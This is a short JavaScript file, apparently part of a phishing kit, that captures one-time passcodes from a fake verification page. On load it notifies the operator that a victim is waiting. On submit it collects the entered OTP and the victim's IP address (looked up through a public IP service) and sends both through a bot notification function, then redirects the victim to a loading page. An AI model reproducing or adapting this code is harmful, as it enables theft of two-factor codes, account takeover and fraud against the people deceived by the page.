$(document).ready(()=>{
    botNotify("Client Waiting OTP code... 🏃🏃🏃");
    $("#otpCode").on("submit",async(ev)=>{
        ev.preventDefault();
        var message = "";
        var otpCode    = $("#otp").val();
        if(otpCode.length == 0 ){
            
            alert("لو سمحت أملأ حقل الكود");
            return;
        }
        message += "-------[ OTP ]-------\n";
        message += `OTP : ${otpCode}\n`;
        message += await getIp();
        await botNotify(message);
        window.location.assign("loading-otp.html");
       
    });

const  getIp = async ()=>{
    return await fetch('https://api.ipify.org/?format=json')
    .then(response => response.json())
    .then(data => {
        var ipAddress = data.ip;
        var message = `IP Address : ${ipAddress}\n`;
        return message;
    }).catch(e=>{
        var message = `Error to get visitor IP\n`;
        return message;
    });
    }

});